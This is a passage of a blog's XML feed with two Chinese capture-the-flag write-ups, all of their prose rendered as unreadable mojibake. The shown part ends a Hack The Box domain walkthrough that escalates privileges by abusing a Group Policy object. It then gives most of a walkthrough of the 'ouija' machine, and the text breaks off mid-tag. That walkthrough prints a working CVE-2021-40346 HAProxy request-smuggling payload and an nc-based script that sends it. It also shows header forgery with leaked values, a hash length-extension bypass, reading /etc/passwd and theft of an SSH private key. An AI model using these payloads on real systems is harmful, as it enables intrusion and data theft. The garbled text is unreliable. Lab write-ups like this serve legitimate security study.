src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-24.png" class="" title="2024-03-14_09-24.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>å› ä¸ºä¸€ç›´æ²¡æœ‰æ‹¿ä¸‹è¶…ç®¡æƒé™ï¼Œå¾ˆå¤šæ“ä½œè¿˜æ˜¯å—é™ï¼Œæ¥ä¸‹æ¥å¯»æ‰¾ææƒçš„æ–¹æ³•ï¼Œåœ¨å¼€å§‹ä¹‹å‰å…ˆç”¨Bloodhoundå¯¼å‡ºæ‰€æœ‰åŸŸä¹‹é—´çš„æ‰€æœ‰å…³è”æ•°æ®</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_20-55.png" class="" title="2024-03-14_20-55.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-15_08-32.png" class="" title="2024-03-15_08-32.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-15_08-42.png" class="" title="2024-03-15_08-42.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>ä¸éš¾å‘ç°å½“å‰æ¨ªå‘åˆ°çš„è¿™ä¸ªç”¨æˆ·æ˜¯ä½äºGPOç»„å†…çš„ï¼Œè€ŒGPO Managerç»„æˆå‘˜å¾ˆå¯èƒ½è¢«æˆäºˆäº†ä¿®æ”¹ã€åˆ›å»ºæˆ–é“¾æ¥ç»„ç­–ç•¥å¯¹è±¡çš„æƒé™ï¼Œç”±äºGPO <a href="mailto:&#77;&#x41;&#x4e;&#69;&#82;&#x47;&#69;&#82;&#83;&#64;&#x4f;&#x46;&#x46;&#73;&#67;&#x45;&#x2e;&#x48;&#84;&#x42;">&#77;&#x41;&#x4e;&#69;&#82;&#x47;&#69;&#82;&#83;&#64;&#x4f;&#x46;&#x46;&#73;&#67;&#x45;&#x2e;&#x48;&#84;&#x42;</a>è¿™ä¸ªç»„ä¸ºADä¸­çš„å®‰å…¨ç»„ï¼Œå› æ­¤å¯èƒ½å¯ä»¥åˆ©ç”¨GPOæ¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œäºæ˜¯åˆ—å‡ºåŸŸä¸­çš„æ‰€æœ‰GPO</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-11.png" class="" title="2024-03-14_10-11.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><p>è¿™ä¸ªæ—¶å€™å°±æœ‰æ€è·¯äº†ï¼Œä½¿ç”¨SharpGPOAbuseåœ¨Active Directoryç¯å¢ƒä¸­é€šè¿‡ä¿®æ”¹â€œDefault Domain Controllers Policyâ€è¿™ä¸ªç»„ç­–ç•¥å¯¹è±¡ï¼Œå°†å½“å‰ç”¨æˆ·è´¦æˆ·æ·»åŠ ä¸ºæ‰€æœ‰å—æ­¤GPOå½±å“çš„åŸŸæ§æœ¬åœ°ç®¡ç†å‘˜ï¼Œä½¿å¾—å½“å‰ç”¨æˆ·è·å¾—å¯¹è¿™äº›åŸŸæ§åˆ¶å™¨çš„é«˜çº§è®¿é—®æƒé™</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-34.png" class="" title="2024-03-14_10-34.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>å¼ºåˆ¶æ›´æ–°ç»„ç­–ç•¥</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-35.png" class="" title="2024-03-14_10-35.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>ç°åœ¨å†æŸ¥çœ‹administratorsç»„ç”¨æˆ·æˆå‘˜ï¼Œå¯ä»¥å‘ç°å½“å‰ç”¨æˆ·å±æ€§ï¼Œå·²ç»åœ¨administratorsé‡Œé¢ï¼Œè¿™æ ·ä¸€æ¥å°±æ‹¥æœ‰äº†administratoræƒé™ï¼ŒææƒæˆåŠŸ æ‹¿ä¸‹ï¼</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-40.png" class="" title="2024-03-14_10-40.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>é†’äº†â€¦åŸæ¥ç»ˆç©¶æ˜¯ä¸€åœºæ¢¦ç½¢äº†</p><p>èµ·åºŠ.<br>åƒæ—©é¥­..<br>æ‘¸é±¼çš„ä¸€å¤©åˆå¼€å§‹äº†â€¦</p>]]></content>
    
    
    <categories>
      
      <category>å†…ç½‘æ¸—é€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŸŸæ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»HAProxyè¯·æ±‚èµ°ç§åˆ°hashé•¿åº¦æ‹“å±•æ”»å‡»</title>
    <link href="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <url>/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>å£°æ˜ï¼šè™šæ‹Ÿç¯å¢ƒæ¼”ç¤º</p><p>æ‰“å¼€ç«™ç‚¹å‘ç°æ˜¯ç”¨giteaæ­å»ºçš„ï¼Œè€Œä¸”å·¦ä¸Šè§’æ¢ç´¢ç‚¹è¿›å»ç›´æ¥å‘ç°äº†userï¼Œä»¥åŠæ•´ä¸ªç½‘ç«™çš„æ¶æ„</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-44.png" class="" title="2024-03-07_10-44.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45.png" class="" title="2024-03-07_10-45.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>è¿›å…¥è¯¥useré¡¹ç›®å½“ä¸­ï¼Œåœ¨æœ€åº•éƒ¨å‘ç°äº†HA-Proxy,å¹¶ä¸”ç‰ˆæœ¬æ˜¯2.2.16</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45_1.png" class="" title="2024-03-07_10-45_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>å¿ƒä¸­é—ªè¿‡ä¸€ä¸ªå¿µå¤´ï¼ŒCVE-2021-40346ï¼Ÿï¼Ÿï¼Ÿäºæ˜¯å°è¯•è¿›è¡ŒHAProxyè¯·æ±‚èµ°ç§ï¼›è¯¥æ¼æ´æ˜¯ä¸€ä¸ªæ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¿›è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»ï¼Œè¿™ç§æ”»å‡»å…è®¸æ”»å‡»è€…å°†HTTPè¯·æ±‚â€œèµ°ç§â€åˆ°åç«¯æœåŠ¡å™¨ï¼Œè€Œä»£ç†æœåŠ¡å™¨ä¸çŸ¥é“è¿™ä¸€ç‚¹ï¼Œèµ°ç§çš„è¯·æ±‚ä¼šäº§ç”Ÿå„ç§å½±å“ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼ŒåŒ…æ‹¬ HAProxy ä¸­å®šä¹‰çš„ä»»ä½• ACL<br>æœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®<br>æ‰§è¡Œæœªç»æˆæƒçš„å‘½ä»¤æˆ–ä¿®æ”¹æ•°æ®<br>åŠ«æŒç”¨æˆ·ä¼šè¯<br>æ— éœ€ç”¨æˆ·äº¤äº’å³å¯åˆ©ç”¨åå°„å‹ XSS æ¼æ´<br></code></pre></td></tr></table></figure><p>HTTPè¯·æ±‚èµ°ç§å®ƒåŸºäºå¹²æ‰°å‰ç«¯æœåŠ¡å™¨ï¼ˆå³HAProxyï¼‰å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´çš„HTTPè¯·æ±‚å¤„ç†ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡å‘é€ç‰¹åˆ¶çš„è¯·æ±‚æ¥åˆ©ç”¨æ­¤æŠ€æœ¯ï¼Œè¯¥è¯·æ±‚çš„æ­£æ–‡ä¸­åŒ…å«é™„åŠ è¯·æ±‚ï¼ŒæˆåŠŸæ”»å‡»åï¼Œå†…éƒ¨è¯·æ±‚ä¼šé€šè¿‡å‰ç«¯èµ°ç§ï¼ˆå‰ç«¯å°†å…¶è§†ä¸ºä»…è¯·æ±‚çš„æ­£æ–‡ï¼‰ï¼Œä½†ä¼šè¢«åç«¯ä½œä¸ºæ­£å¸¸è¯·æ±‚ä½¿ç”¨<br>å¸¸åˆ©ç”¨çš„æ”»å‡»åœºæ™¯â€”â€”ç»•è¿‡ http è¯·æ±‚ ACLï¼šè§¦å‘HTTPè¯·æ±‚èµ°ç§æ”»å‡»ä»¥ç»•è¿‡HAProxyå®šä¹‰çš„ACLè§„åˆ™</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_09-27.png" class="" title="2024-03-08_09-27.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br><span class="hljs-attribute">Content</span>-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">23</span><br><br><span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">h</span>:GET /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/</a></p><p>æ¥ä¸‹æ¥åˆ©ç”¨haä»£ç†æ¼æ´ï¼Œé€šè¿‡å°è¯•è¯·æ±‚èµ°ç§è®¿é—®å­åŸŸï¼Œfuzzä¸€ä¸‹å­åŸŸ</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-23.png" class="" title="2024-03-07_11-23.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>æŠ“åŒ…ï¼Œé€šè¿‡payloadæ„é€ æ•°æ®åŒ…ï¼Œå¦‚æœç”¨burpçš„è¯ï¼Œéœ€è¦å…³æ‰burpçš„è‡ªåŠ¨å†…å®¹é•¿åº¦æ›´æ–°ï¼Œç„¶åè‡ªå·±æ ¹æ®å®é™…è¯·æ±‚æ‰‹åŠ¨æŒ‡å®šContent-Length</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-15.png" class="" title="2024-03-07_11-15.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-19.png" class="" title="2024-03-07_11-19.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>æ ¹æ®payload,å¯ä»¥å†™ä¸€ä¸ªbashè„šæœ¬ï¼Œé€šè¿‡æ•´æ•°æº¢å‡ºå¯¼è‡´çš„è¯·æ±‚èµ°ç§æ¥è¯»å–æ•æ„Ÿä¿¡æ¯</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">#<span class="hljs-operator">!/</span>bin<span class="hljs-operator">/</span>bash<br><br>path<span class="hljs-operator">=</span><span class="hljs-variable">$1</span><br>cl<span class="hljs-operator">=</span>$((<span class="hljs-number">16</span><span class="hljs-operator">+</span>`echo <span class="hljs-variable">$path</span> <span class="hljs-operator">|</span> wc <span class="hljs-operator">-</span>m`))<br>caixukun<span class="hljs-operator">=</span><span class="hljs-string">&quot;POST / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: $cl<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>GET $path HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>h:GET / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br><br>echo <span class="hljs-operator">-</span>ne <span class="hljs-variable">$caixukun</span> <span class="hljs-operator">|</span> nc <span class="hljs-operator">-</span>w <span class="hljs-number">1</span> ouija.htb <span class="hljs-number">80</span> <span class="hljs-operator">|</span> sed <span class="hljs-operator">-</span>n &#x27;<span class="hljs-number">428</span>,<span class="hljs-variable">$p</span>&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-22.png" class="" title="2024-03-07_11-22.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>å°è¯•è®¿é—®å­åŸŸï¼Œå‘ç°äº†ä¸¤ä¸ªæ•æ„Ÿæ–‡ä»¶ï¼Œä¸€ä¸ªjså’Œä¸€ä¸ªbashè„šæœ¬</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-26.png" class="" title="2024-03-07_11-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>å°è¯•è¯»å–ï¼Œå‘ç°å¯ä»¥è¯»å–æˆåŠŸ<br>app.js</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-32_1.png" class="" title="2024-03-07_11-32_1.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>init.sh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config starts&quot;</span> &gt;&gt;<br><span class="hljs-built_in">mkdir</span> -p .config/bin .config/local .config/share /var/log/zapi<br><span class="hljs-built_in">export</span> k=$(<span class="hljs-built_in">cat</span> /opt/auth/api.key)<br><span class="hljs-built_in">export</span> botauth_id=<span class="hljs-string">&quot;bot1:bot&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-built_in">hash</span>=<span class="hljs-string">&quot;4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1&quot;</span><br><span class="hljs-built_in">ln</span> -s /proc .config/bin/process_informations<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config done&quot;</span> &gt;&gt; /var/log/zapi/api.log<br><br><span class="hljs-built_in">exit</span> 1<br></code></pre></td></tr></table></figure><p>åœ¨å‰æœŸä¿¡æ¯æ”¶é›†é˜¶æ®µï¼Œå‘ç°äº†ä¸€ä¸ª3000ç«¯å£ï¼Œè®¿é—®äº†usersè·¯ç”±ï¼Œæç¤ºç¼ºå°‘ihash headerï¼Œæµ‹è¯•æ·»åŠ åæç¤ºç¼ºå°‘identification headerï¼Œæ·»åŠ identificationåä¹Ÿæ˜¯tokenæ— æ•ˆ</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-37.png" class="" title="2024-03-07_10-37.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>åœ¨init.shè„šæœ¬é‡Œé¢æœ‰ä¸ªapi.logçš„æ—¥å¿—æ–‡ä»¶ï¼Œå†æ¬¡å°è¯•è¯»å–ï¼Œå‘ç°è¯»ä¸åˆ°ï¼Œå®¡è®¡jsä»£ç ï¼Œå‘ç°æ¥å£åªæœ‰&#x2F;file&#x2F;getå¯ä»¥å·¥ä½œï¼Œå¹¶ä¸”å¦‚æœè¦è°ƒç”¨è¿™ä¸ªapiçš„è¯ï¼Œéœ€è¦hearder identificationå’Œihashæ‰èƒ½è®¿é—®</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57.png" class="" title="2024-03-07_11-57.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>é‚£è¯´æ˜å’Œé‚£ä¸ª3000ç«¯å£æœ‰è”ç³»ï¼Ÿè€Œidentificationå’Œihashä¹Ÿå­˜åœ¨init.shé‡Œé¢ï¼Œé‚£å¸¦ä¸Šidentificationå’Œihashè¯•è¯•ï¼Ÿ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -H &#x27;ihash: 4b22a<span class="hljs-number">041884</span>7a<span class="hljs-number">51650623</span>a458acc1bba5c01f<span class="hljs-number">6521</span>ea<span class="hljs-number">613587</span>2b9f15b56b988c1&#x27; -H <span class="hljs-string">&quot;identification: `echo -ne bot1:bot | xxd -plain | base64`&quot;</span> <span class="hljs-string">&quot;http://ouija.htb:3000/users&quot;</span><br></code></pre></td></tr></table></figure><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-44.png" class="" title="2024-03-07_11-44.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>å¥½å¥½å¥½ï¼Œç›´æ¥ç»™æˆ‘è¯´æ²¡æƒé™..ç»§ç»­å®¡è®¡jsä»£ç ï¼Œå‘ç°æƒ³è¦è°ƒç”¨&#x2F;file&#x2F;getåŠŸèƒ½ï¼Œéœ€è¦è¿‡äº†ensure_authå‡½æ•°æ ¡éªŒã€‚æ­¤å‡½æ•°åˆè°ƒç”¨äº†verify_cookieså’Œdå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªsha256å’Œbase64+hex</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-59.png" class="" title="2024-03-07_11-59.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_12-00.png" class="" title="2024-03-07_12-00.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>è€Œä¸”æˆ‘å‘ç°åœ¨æ£€æŸ¥identificationæ˜¯å¦å­˜åœ¨::admin:Trueæ—¶è¿æ¥å‡ºé”™ï¼Œè²Œä¼¼åªæ˜¯ç®€å•åœ°è¿›è¡Œå­˜åœ¨æ€§æ£€æŸ¥ï¼Œé‚£å¦‚æœæˆ‘çš„identificationåŒ…å«::admin:Trueå’Œå…¶ä»–å­—ç¬¦ï¼Œæ˜¯å¦å°±å¯ä»¥ç»•è¿‡ï¼Ÿï¼Ÿ</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57_1.png" class="" title="2024-03-07_11-57_1.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>ç»¼ä¸Šï¼Œç°æœ‰æƒ…å†µå°±æ˜¯ï¼šæˆ‘ä»¬çŸ¥é“æ‰€éœ€çš„éƒ¨åˆ†æ˜æ–‡å’Œå‡½æ•°åŠ å¯†æ–¹å¼ï¼Œä»¥åŠç›®æ ‡hashï¼Œä½†å¹¶ä¸çŸ¥é“æ‰€éœ€çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Œåœ¨è¿™ç§åœºæ™¯å¯ä»¥è¿›è¡Œhashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œæˆ‘è§‰å¾—æš´ç ´é•¿åº¦æ€»æ¯”æš´ç ´å¯†é’¥ç®€å•å¤šäº†å§ï¼Œä¸Šè„šæœ¬</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_13-48.png" class="" title="2024-03-07_13-48.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-29.png" class="" title="2024-03-07_14-29.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>è¿™æ ·ä¸€æ¥ï¼Œå°±è·å¾—äº†ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®ç«¯å£3000çš„æƒé™ï¼Œå°±å¯ä»¥åˆ©ç”¨&#x2F;file&#x2F;getæ¥å£è¯»å–æ•æ„Ÿä¿¡æ¯ï¼Œå…ˆå°è¯•è¯»å–ä¸€ä¸‹åˆšæ‰çš„é‚£ä¸¤ä¸ªæ–‡ä»¶ï¼Œå‘ç°æˆåŠŸè¯»å–init.sh</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-32.png" class="" title="2024-03-07_14-32.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>å¯ä»¥å‘ç°ï¼Œinit.shé‡Œæœ‰ä¸€è¡Œâ€œln -s &#x2F;proc .config&#x2F;bin&#x2F;process_informationsâ€ï¼Œæ˜¯ä¸ªè½¯é“¾æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè½¯é“¾æ¥é€šè¿‡procè¿‡å»æ¥è¯»å–å…¶ä»–æ–‡ä»¶ï¼ˆåˆšæ‰æˆ‘ä¸ºå•¥æ²¡æ³¨æ„åˆ°ï¼‰ï¼Œå°è¯•è¯»å–&#x2F;etc&#x2F;passwd</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-33.png" class="" title="2024-03-07_14-33.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¯»å–.sshç›®å½•ï¼Œå¦‚æœæœ‰ç§é’¥ï¼Œå°±å¯ä»¥ç›´æ¥çªƒå–ç§é’¥è¿›è¡Œsshå…å¯†ç™»å½•ï¼Œä»è€Œæ‹¿ä¸‹æ§åˆ¶æƒé™</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-35.png" class="" title="2024-03-07_14-35.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>okkï¼ŒåŠ ä¸Šä¸€å¼€å§‹å°±æ³„æ¼äº†ä¸€ä¸ªç”¨æˆ·åï¼Œå°è¯•sshç™»å½•</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-38.png" class="" title="2024-03-07_14-38.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>è¿™ä¸ªæ—¶å€™å…¶å®å·²ç»æ‹¿ä¸‹äº†ï¼Œä½†è¿›éƒ½è¿›å»äº†ï¼Œä¸å¾—çœ‹çœ‹ï¼Ÿæ‰€ä»¥ä¸‹é¢çš„å°±æ˜¯å†™ç€ç©çš„</p><img 